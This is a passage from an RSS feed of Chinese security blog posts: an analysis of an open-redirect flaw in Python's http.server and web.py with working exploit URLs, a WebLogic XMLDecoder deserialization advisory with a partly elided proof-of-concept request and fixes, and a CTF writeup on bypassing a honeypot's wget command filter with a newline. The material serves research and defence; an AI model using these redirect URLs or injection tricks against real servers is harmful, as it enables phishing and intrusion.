&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-5cc0dbfc9fb023180000c2db6facb0c7_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;作者：Phith0n&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;Github账号被封了以后，Vulhub也无法继续更新了，余下很多时间，默默看了点代码，偶然还能遇上一两个漏洞，甚是有趣。&lt;/p&gt;&lt;p&gt;这个漏洞出现在python核心库http中，发送给官方团队后被告知撞洞了，&lt;b&gt;且官方也认为需要更多人看看怎么修复这个问题&lt;/b&gt;，所以我们来分析一下。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x01  http.server库简单分析&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;众所周知Python有一个一键启动Web服务器的方法：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;python3 -m http.server&lt;/code&gt;&lt;p&gt;在任意目录执行如上命令，即可启动一个web文件服务器。其实这个方法就用到了http.server模块。这个模块包含几个比较重要的类：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;HTTPServer这个类继承于socketserver.TCPServer，说明其实HTTP服务器本质是一个TCP服务器&lt;/li&gt;&lt;li&gt;BaseHTTPRequestHandler，这是一个处理TCP协议内容的Handler，目的就是将从TCP流中获取的数据按照HTTP协议进行解析，并按照HTTP协议返回相应数据包。但这个类解析数据包后没有进行任何操作，不能直接使用。如果我们要写自己的Web应用，应该继承这个类，并实现其中的do_XXX等方法。&lt;/li&gt;&lt;li&gt;SimpleHTTPRequestHandler，这个类继承于BaseHTTPRequestHandler，从父类中拿到解析好的数据包，并将用户请求的path返回给用户，等于实现了一个静态文件服务器。&lt;/li&gt;&lt;li&gt;CGIHTTPRequestHandler，这个类继承于SimpleHTTPRequestHandler，在静态文件服务器的基础上，增加了执行CGI脚本的功能。&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;简单来说就是如下：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;+-----------+          +------------------------+    
| TCPServer |          | BaseHTTPRequestHandler |
+-----------+          +------------------------+ 
     ^                            |
     |                            v
     |                +--------------------------+
     +----------------| SimpleHTTPRequestHandler |
     |                +--------------------------+
     |                            |
     |                            v
     |                 +-----------------------+
     +-----------------| CGIHTTPRequestHandler |
                       +-----------------------+&lt;/code&gt;&lt;p&gt;我们看看&lt;code class=&quot;inline&quot;&gt;SimpleHTTPRequestHandler&lt;/code&gt;的源代码：&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    server_version = &quot;SimpleHTTP/&quot; + __version__

    def do_GET(self):
        &quot;&quot;&quot;Serve a GET request.&quot;&quot;&quot;
        f = self.send_head()
        if f:
            try:
                self.copyfile(f, self.wfile)
            finally:
                f.close()

    # ...

    def send_head(self):
        path = self.translate_path(self.path)
        f = None
        if os.path.isdir(path):
            parts = urllib.parse.urlsplit(self.path)
            if not parts.path.endswith(&#39;/&#39;):
                # redirect browser - doing basically what apache does
                self.send_response(HTTPStatus.MOVED_PERMANENTLY)
                new_parts = (parts[0], parts[1], parts[2] + &#39;/&#39;,
                             parts[3], parts[4])
                new_url = urllib.parse.urlunsplit(new_parts)
                self.send_header(&quot;Location&quot;, new_url)
                self.end_headers()
                return None
            for index in &quot;index.html&quot;, &quot;index.htm&quot;:
                index = os.path.join(path, index)
                if os.path.exists(index):
                    path = index
                    break
            else:
                return self.list_directory(path)
        # ...&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;前面HTTP解析的部分不再分析，如果我们请求的是GET方法，将会被分配到&lt;code class=&quot;inline&quot;&gt;do_GET&lt;/code&gt;函数里，在&lt;code class=&quot;inline&quot;&gt;do_GET()&lt;/code&gt;中调用了&lt;code class=&quot;inline&quot;&gt;send_head()&lt;/code&gt;方法。&lt;/p&gt;&lt;p&gt;&lt;code class=&quot;inline&quot;&gt;send_head()&lt;/code&gt;中调用了&lt;code class=&quot;inline&quot;&gt;self.translate_path(self.path)&lt;/code&gt;将request path进行一个标准化操作，目的是获取用户真正请求的文件。如果这个path是一个已存在的目录，则进入if语句。&lt;/p&gt;&lt;p&gt;如果用户请求的path不是以&lt;code class=&quot;inline&quot;&gt;/&lt;/code&gt;结尾，则进入第二个if语句，这个语句中执行了HTTP跳转的操作，这就是我们当前漏洞的关键点了。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x02  任意URL跳转漏洞&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;如果我们请求的是一个已存在的目录，但PATH没有以&lt;code class=&quot;inline&quot;&gt;/&lt;/code&gt;结尾，则将PATH增加&lt;code class=&quot;inline&quot;&gt;/&lt;/code&gt;并用301跳转。&lt;/p&gt;&lt;p&gt;这就涉及到了一个有趣的问题：在chrome、firefox等主流浏览器中，如果url以&lt;code class=&quot;inline&quot;&gt;//domain&lt;/code&gt;开头，浏览器将会默认认为这个url是当前数据包的协议。比如，我们访问&lt;code class=&quot;inline&quot;&gt;http://example.com&lt;/code&gt;，跳转到&lt;code class=&quot;inline&quot;&gt;//baidu.com/&lt;/code&gt;，则浏览器会默认认为跳转到&lt;code class=&quot;inline&quot;&gt;http://baidu.com&lt;/code&gt;，而不是跳转到&lt;code class=&quot;inline&quot;&gt;.//baidu.com/目录&lt;/code&gt;&lt;a href=&quot;//baidu.com/%E7%9B%AE%E5%BD%95%E3%80%82&quot;&gt;。&lt;/a&gt;&lt;/p&gt;&lt;p&gt;所以，如果我们发送的请求的是&lt;code class=&quot;inline&quot;&gt;GET //baidu.com HTTP/1.0\r\n\r\n&lt;/code&gt;，那么将会被重定向到&lt;code class=&quot;inline&quot;&gt;//baidu.com/&lt;/code&gt;，也就产生了一个任意URL跳转漏洞。&lt;/p&gt;&lt;p&gt;在此前，由于目录&lt;code class=&quot;inline&quot;&gt;baidu.com&lt;/code&gt;不存在，我们还需要绕过&lt;code class=&quot;inline&quot;&gt;if os.path.isdir(path)&lt;/code&gt;这条if语句。绕过方法也很简单，因为&lt;code class=&quot;inline&quot;&gt;baidu.com&lt;/code&gt;不存在，我们跳转到上一层目录即可：&lt;/p&gt;&lt;code lang=&quot;html&quot;&gt;GET //baidu.com/%2f.. HTTP/1.0\r\n\r\n&lt;/code&gt;&lt;p&gt;如何测试这个漏洞呢？其实也很简单，直接用&lt;code class=&quot;inline&quot;&gt;python3 -m http.server&lt;/code&gt;启动一个HTTP服务器即可。访问&lt;code class=&quot;inline&quot;&gt;http://127.0.0.1:8000//example.com/%2f%2e%2e&lt;/code&gt;即可发现跳转到了&lt;code class=&quot;inline&quot;&gt;http://example.com/%2f../&lt;/code&gt;。&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-55826f561cc369457771b1d24cef42fa_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1207&quot; data-rawheight=&quot;489&quot;&gt;&lt;h2&gt;&lt;b&gt;0x03  web.py任意URL跳转漏洞&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;那么，虽然说python核心库存在这个漏洞，不过通常情况下不会有人直接在生产环境用&lt;code class=&quot;inline&quot;&gt;python -m http.server&lt;/code&gt;。&lt;/p&gt;&lt;p&gt;Python框架web.py在处理静态文件的代码中继承并使用了&lt;code class=&quot;inline&quot;&gt;SimpleHTTPRequestHandler&lt;/code&gt;类，所以也会受到影响。&lt;/p&gt;&lt;p&gt;我们可以简单测试一下，我们用web.py官网的示例代码创建一个web应用：&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;import web

urls = (
    &#39;/(.*)&#39;, &#39;hello&#39;
)
app = web.application(urls, globals())


class hello:
    def GET(self, name):
        if not name:
            name = &#39;World&#39;
        return &#39;Hello, &#39; + name + &#39;!&#39;


if __name__ == &quot;__main__&quot;:
    app.run()&lt;/code&gt;&lt;p&gt;然后模拟真实环境，创建一个static目录，和一些子目录：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;static
├── css
│   └── app.css
└── js
    └── app.js&lt;/code&gt;&lt;p&gt;运行后，直接访问&lt;code class=&quot;inline&quot;&gt;http://127.0.0.1:8080////static%2fcss%2f@www.example.com/..%2f&lt;/code&gt;即可发现已成功跳转。&lt;/p&gt;&lt;p&gt;&lt;code class=&quot;inline&quot;&gt;web.py&lt;/code&gt;的具体分析我就不多说了，由于请求必须有&lt;code class=&quot;inline&quot;&gt;/static/&lt;/code&gt;前缀，所以利用方法有些不同，不过核心原理也无差别。&lt;/p&gt;</description>
<author>perhaps</author>
<guid isPermaLink="false">2018-01-03-32592960</guid>
<pubDate>Wed, 03 Jan 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>WebLogic WLS-WebServices组件反序列化漏洞分析</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2017-12-22-32267755.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/32267755&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-9c0a15dc5b98d566b7debef255ec28cc_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;       最近由于数字货币的疯涨，大量机器被入侵后用来挖矿，其中存在不少部署了Weblogic服务的机器，因为Weblogic最近所爆出安全漏洞的exploit在地下广泛流传。回到这个漏洞本身，其原因在于WLS-WebServices这个组件中，因为它使用了XMLDecoder来解析XML数据。有安全研究人员在去年八月份就向官方报告了此漏洞，Oracle官方在今年四月份提供了补丁程序。但是，四月份提供的补丁感觉是在敷衍了事，因此很快就被绕过了。为此官方又只能新发补丁，不过十月份所提供的补丁，检查还是比较严格。下面具体来看看此次反序列漏洞&lt;/p&gt;&lt;h2&gt;0x01漏洞复现&lt;/h2&gt;&lt;p&gt;测试环境 Weblogic 10.3.6.0/jdk1.6.0_45/Linux&lt;/p&gt;&lt;p&gt;漏洞POC&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;POST /wls-wsat/CoordinatorPortType11 HTTP/1.1
Host: 127.0.0.1:7001
Cache-Control: max-age=0
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36
Upgrade-Insecure-Requests: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7
Connection: close
Content-Type: text/xml
Content-Length: 777

&amp;lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&amp;gt;   
  &amp;lt;soapenv:Header&amp;gt; 
    &amp;lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&amp;gt;  
      &amp;lt;java&amp;gt; 
        ·······
      &amp;lt;/java&amp;gt; 
    &amp;lt;/work:WorkContext&amp;gt; 
  &amp;lt;/soapenv:Header&amp;gt;  
  &amp;lt;soapenv:Body/&amp;gt; 
&amp;lt;/soapenv:Envelope&amp;gt;&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-650fc1f00e4884b247bf8d0fb49c8586_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;2862&quot; data-rawheight=&quot;1348&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-87d35ddbf6cf711302c0a2e704a90d4b_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;691&quot; data-rawheight=&quot;237&quot;&gt;&lt;p&gt;在漏洞复现过程中，只需将恶意的XML数据包发送到wls-wsat此路径下的任意一个URL即可，因为后端处理流程都是一样的。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;0x02漏洞分析&lt;/h2&gt;&lt;p&gt;此次漏洞出现在wls-wsat.war中，此组件使用了weblogic自带的webservices处理程序来处理SOAP请求。首先在weblogic.wsee.jaxws.workcontext.WorkContextServerTube类中获取XML数据最终传递给XMLDecoder来解析，其解析XML的调用链为&lt;/p&gt;&lt;code lang=&quot;java&quot;&gt;weblogic.wsee.jaxws.workcontext.WorkContextServerTube.processRequest
weblogic.wsee.jaxws.workcontext.WorkContextTube.readHeaderOld
weblogic.wsee.workarea.WorkContextXmlInputAdapter&lt;/code&gt;&lt;p&gt;首先看到weblogic.wsee.jaxws.workcontext.WorkContextServerTube.processRequest方法&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-09f77b0b1d6b41dfc5d18911bcd6745e_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1724&quot; data-rawheight=&quot;608&quot;&gt;&lt;p&gt;获取到localHeader1后传递给readHeaderOld方法，其内容为&amp;lt;work:WorkContext&amp;gt;所包裹的数据，然后继续跟进weblogic.wsee.jaxws.workcontext.WorkContextTube.readHeaderOld方法&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-a3cd3e829509f3fea078551540ffdfbe_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;2162&quot; data-rawheight=&quot;654&quot;&gt;&lt;p&gt;在此方法中实例化了WorkContextXmlInputAdapter类，并且将获取到的XML格式的序列化数据传递到此类的构造方法中，最后通过XMLDecoder来进行反序列化操作。&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-72625de63712c5f2b3fc372250969470_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1164&quot; data-rawheight=&quot;190&quot;&gt;&lt;p&gt;关于XMLDecoder的反序化问题13年就已经被人发现，近期再次被利用到Weblogic中由此可见JAVA生态圈中的安全问题是多么糟糕。值得一提的是此次漏洞出现了两处CVE编号，因为在Oracle官方在修复CVE-2017-3506所提供的patch只是简单的检查了XML中是否包含了&amp;lt;object&amp;gt;节点，然后将&amp;lt;object&amp;gt;换为&amp;lt;void&amp;gt;即可绕过此补丁。因此在修复过程中用户一定要使用Oracle官方十月份所提供的patch。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;0x03漏洞修复&lt;/h2&gt;&lt;p&gt;1. 临时解决方案&lt;/p&gt;&lt;p&gt;根据业务所有需求，考虑是否删除WLS-WebServices组件。包含此组件路径为：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/wls-wsat
Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/.internal/wls-wsat.war
Middleware/wlserver_10.3/server/lib/wls-wsat.war&lt;/code&gt;&lt;p&gt;以上路径都在WebLogic安装处。删除以上文件之后，需重启WebLogic。确认http://weblogic_ip/wls-wsat/ 是否为404页面。&lt;/p&gt;&lt;p&gt;2. 官方补丁修复&lt;/p&gt;&lt;p&gt;前往Oracle官网下载10月份所提供的安全补丁。如需帮助请咨询info@chaitin.com。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;0x04 参考资料&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;http://blog.diniscruz.com/2013/08/using-xmldecoder-to-execute-server-side.html&quot;&gt;http://blog.diniscruz.com/2013/08/using-xmldecoder-to-execute-server-side.html&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/pwntester/XMLDecoder&quot;&gt;pwntester/XMLDecoder&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://www.oracle.com/technetwork/security-advisory/cpuoct2017-3236626.html&quot;&gt;http://www.oracle.com/technetwork/security-advisory/cpuoct2017-3236626.html&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://open.work.weixin.qq.com/wwopen/mpnews?mixuin=3_HVCQAABwBuIkeyAAAUAA&amp;amp;mfid=WW0322-Jy56dgAABwC3hf2NINzB1w1SNvc1c&amp;amp;idx=0&amp;amp;sn=55e0f6343b34c62e1980af706e491188&quot;&gt;安全服务号&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;</description>
<author>Tomato会打字</author>
<guid isPermaLink="false">2017-12-22-32267755</guid>
<pubDate>Fri, 22 Dec 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>LCTF 2017 未解之谜：树莓派 Writeup（内附全部 Wp 链接）</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2017-11-21-31256263.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/31256263&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-ddba89a70d915f9f029d273a28ec2d1a_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;在刚刚结束的 &lt;a href=&quot;http://lctf.pwnhub.cn/&quot;&gt;LCTF 2017&lt;/a&gt; 中，仍有一些未解的题目，今天笔者就来和各位胖友分享第一道未解之谜—— Misc 类下的「树莓派」，Writeup 来自本次比赛主办方 L-Team 。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;PS: 其它未解之谜见文末链接。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;&lt;i&gt;作者：L-Team&lt;/i&gt;&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0X01  刚上线&lt;/b&gt;&lt;/h2&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-1f7d0b870059146a98278673115cb54b_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1014&quot; data-rawheight=&quot;582&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;ol&gt;&lt;li&gt;题目介绍只给了个 IP ，有师傅当做 Web 题，发现点不开。&lt;/li&gt;&lt;li&gt;扫了一波端口后，只有 22 开着，所以入口点肯定在这里。&lt;/li&gt;&lt;li&gt;根据题目的提示，按照正常的思维确实应该登录 `pi:raspberry` ，本来也是打算设置成这样，但是这个密码太弱了，题目还没上线就被黑铲扫了好几波，直接改密码种木马一波带走了。所以就改了一个需要一些脑洞的密码 `pi:shumeipai` ，可能有师傅在这里卡了一下。&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0X02  第一个hint&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;blockquote&gt;&lt;b&gt;hint1：都告诉你密码了&lt;/b&gt;&lt;/blockquote&gt;&lt;p&gt;1. 这个 hint 主要提示弱密码是什么，因为不想让师傅们耽误太多时间，给出后很多师傅都上来了。&lt;/p&gt;&lt;p&gt;2. 这时候 SSH 进去会发现是一个低权限帐号，很多操作都受限了，`uname` 看内核版本也很高，这之后很多师傅就开始四处搜刮 `flag` ，`bash_history` 、`.swp` 等等，还看了所有文件的修改时间。&lt;/p&gt;&lt;p&gt;3. 但是一番搜索后除了那个假 flag 什么发现也没有。在搜索的过程中，查看主机的网络状态`netstat -autpn`，会发现所有的 SSH 连接来源都是 `172.18.0.3` ，在这里应该会产生一些疑问，ping `172.18.0.1`、`172.18.0.3` 都是通的，pi 本机是 `172.18.0.2` 。&lt;/p&gt;&lt;p&gt;4. 这时候可以猜测，SSH连接被 `0.3` 动了手脚，通过 SSH 的指纹完全可以验证 `0.3` 是师傅们和 `0.2` 之间的中间人。&lt;/p&gt;&lt;p&gt;5. 下图是我们 SSH 连接时收到的公钥指纹&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-0b346c41cf3100d61bcfef792c2427d0_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1130&quot; data-rawheight=&quot;737&quot;&gt;&lt;p&gt;6. 下图是 `172.18.0.2` 主机 SSHD 配置文件夹中的公钥:&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-60655542670698bad173a9569ccfc49d_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1133&quot; data-rawheight=&quot;198&quot;&gt;&lt;p&gt;7. 可以看出两者是不一样的，所以验证了 `0.3` 在做 SSH 连接的中间人的猜测，这样一来有很大可能真的flag在 `0.3` 里。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0X02  第二个hint&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;blockquote&gt;&lt;b&gt;hint：pcap&lt;/b&gt;&lt;/blockquote&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;1.这是一个很重要的 hint ，流量中出现的主要IP是 `172.18.0.2` `172.18.0.3` ，在流量包里可以看到明显的特征：在建立了 SSH 连接后，外网发给 `0.3` 的加密数据包，`0.3` 会先与 `0.2` 通信，`0.2` 返回给 `0.3` 数据后，`0.3` 再返回给外网的 IP ，在这里也能够证实 `0.3` 在做 SSH 的中间人。&lt;/p&gt;&lt;p&gt;2. 一般打 CTF 的流量包里面都会藏一些有用的东西，所以这里设了个坑，下载了一个 `53.bin` ，但是文件的具体内容没有什么用，此文件实际上是之前部署在公网的蜜罐捕获到的 DDos 木马，所以先对执行了此文件的师傅说声对不起。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-acf16242ced2773eb984ab5dc848d42e_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1422&quot; data-rawheight=&quot;957&quot;&gt;&lt;p&gt;3. 但是下载这个 `53.bin` 也不完全是坑人的，流量包里的 Http 都很重要，过滤一下 Http 可以看到只有几个数据包，`User-Agent` 是 wget ，wget 了 `cip.cc` ，并重定向到了 `www.cip.cc` ，这么做的初衷了为了暴露题目的公网 IP ，但是师傅们后来决定先不放这个流量包，所以题目描述直接把 IP 给出来了，这里也没什么用了。&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-2fa186d9a6b1824cfab471f752f3d04d_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1517&quot; data-rawheight=&quot;719&quot;&gt;&lt;p&gt;4. 那为什么 `53.bin` 有 `request` 没有 `response` 捏，实际上 Follow 一下 TCP stream 就能看到后面的都是二进制的数据，Wireshark 没有把他们识别为 HTTP 协议。&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-62ea62905871068ed004219306d267bc_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1522&quot; data-rawheight=&quot;765&quot;&gt;&lt;p&gt;5. 实际上这个包最关键的地方在下图中两个 `GET 53.bin` ，这里涉及到一些蜜罐的东西，玩过 SSH 蜜罐的师傅可能了解，入侵者下载的恶意文件很可能随着执行而自动删除，所以绝大多数 SSH 蜜罐，无论低中高交互都会有一个功能，就是碰到 wget 命令，会解析命令并自动下载里面包含的恶意文件，这也就解释了为什么 wget 命令在两台主机上都执行了一次。&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-54c554af387d77a1ce13dc56cac506f4_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;886&quot; data-rawheight=&quot;43&quot;&gt;&lt;p&gt;6. 所以如果 wget 命令及参数没有解析好的话，是有可能导致命令注入的。这一点在后面的 hint 也有提示。这个漏洞我比较粗暴的设置为，当 `0.3` 主机得到了攻击者的命令，如果命令以 wget 为开头，則直接 `os.system(cmd)` ，当然还是做了一些过滤的。&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-d2509472554cb9bc404c51dc3cd77637_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;948&quot; data-rawheight=&quot;382&quot;&gt;&lt;p&gt;7. 可以看到 Shell 里常见的引入新的命令的符号大多数都做了过滤，比如 `&amp;amp; | $()` ，但是还是留下了姿势可以绕过，比如 `\n` ，&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-dda8502820250d40b96c57de63b1fdbc_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;588&quot; data-rawheight=&quot;106&quot;&gt;&lt;p&gt;8. ssh tunnel 的应用除了我们常用的 shell ，实际上还有 exec ，此应用不会在 sshd 上请求 shell ，只执行一条命令，比如 `ssh &lt;a href=&quot;mailto:pi@123.123.123.123&quot;&gt;pi@123.123.123.123&lt;/a&gt; &#39;ls&#39;`&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;9. 但为了方便构造，可以使用 python 的 `paramiko` 库来 Get flag&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-82b8817b210536f2f3f4cdc69102a75f_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1132&quot; data-rawheight=&quot;151&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-8f2d47d8b03554a8053c524b87590f05_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1129&quot; data-rawheight=&quot;284&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;10. 实际上也可以直接 Getshell&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-bc55605618eabf2f967428ebbe58ef9d_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1664&quot; data-rawheight=&quot;406&quot;&gt;&lt;h2&gt;&lt;b&gt;0X03  最后&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;1. wetland 是我之前写的一个高交互 SSH 蜜罐，基于 python 的 `paramiko` 库。这个题就是直接拿它改动了一点。地址在&lt;a href=&quot;https://github.com/ohmyadd&quot;&gt;本 github 账号&lt;/a&gt;的 wetland 仓库里。&lt;/p&gt;&lt;p&gt;2. 题目的架构为真实云主机上跑两个 Docker 容器，分别为 `wetland(172.18.0.3)` 和 `sshd(172.18.0.2)` ，其中 wetland 是蜜罐程序，sshd 用于执行黑客的命令。&lt;/p&gt;&lt;p&gt;3. 两个容器的 Dockerfile 在 docker 文件夹中，sshd 是对 `rastasheep/ubuntu-sshd` 的修改，降低了权限。wetland 是对 docker hub 上 `ohmyadd/wetland` 镜像的修改，修改了两个文件，加上了命令注入。&lt;/p&gt;&lt;p&gt;4. 最后既然是蜜罐，肯定会记录执行的操作啦，日志文件都有保留，但不知道公开合不合适，就先不放出来了。&lt;/p&gt;&lt;p&gt;5. 最后一张用 bearychat 来实时看都有什么操作 :-)&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-1a9f083ef060bf0ab80b30012d1ec9a0_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;344&quot; data-rawheight=&quot;600&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;LCTF 2017 其它未解之谜在这里&lt;/b&gt;：&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://blog.pwnhub.cn/2017/11/21/LCTF-2017-%E6%9C%AA%E8%A7%A3%E4%B9%8B%E8%B0%9C%EF%BC%9ABeRealDriver-Writeup/&quot;&gt;LCTF 2017 未解之谜：BeRealDriver &amp;amp;&amp;amp; YublKey Writeu&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://blog.pwnhub.cn/2017/11/21/Py-trade2-Writeup/&quot;&gt;LCTF 2017 未解之谜：Py.trade2 Writeup&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;欢迎各位在评论区留言，与我们交流喔！本次比赛其它 Writeup 也将陆续发出！&lt;/p&gt;</description>
<author>perhaps</author>
<guid isPermaLink="false">2017-11-21-31256263</guid>
<pubDate>Tue, 21 Nov 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>Unity游戏菜鸡玩家的制胜之路</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2017-11-07-30703785.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/30703785&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
